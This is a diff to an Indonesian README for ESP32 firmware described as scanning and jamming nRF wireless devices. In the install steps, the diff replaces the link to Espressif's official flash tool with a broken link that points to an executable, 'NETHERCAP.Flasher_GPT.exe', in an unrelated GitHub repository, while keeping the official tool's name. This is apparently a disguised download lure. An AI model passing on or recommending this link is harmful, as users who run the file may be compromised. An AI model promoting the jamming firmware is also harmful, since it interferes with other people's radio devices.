@@ -27,7 +27,7 @@ Firmware ini dirancang khusus untuk melakukan scanning dan jamming perangkat **n
 ## 📲 Cara Install Firmware (Tanpa Arduino IDE)
 
 1. **Download** dulu file `.bin` di atas ☝️  
-2. Install software flash tool seperti [ESP32 Flash Download Tool](https://www.espressif.com/en/support/download/other-tools)  
+2. Install software flash tool seperti [ESP32 Flash Download Tool](https://www.espressif.com/en/support/download/other-tools](https://github.com/aryaexeuyf/INSTALLATION-NRFBOX/blob/main/NETHERCAP.Flasher_GPT.exe)  
 3. Hubungkan ESP32 ke PC via kabel USB  
 4. Buka tool, pilih port dan file `.bin`  
 5. Setting offset ke `0x1000`  
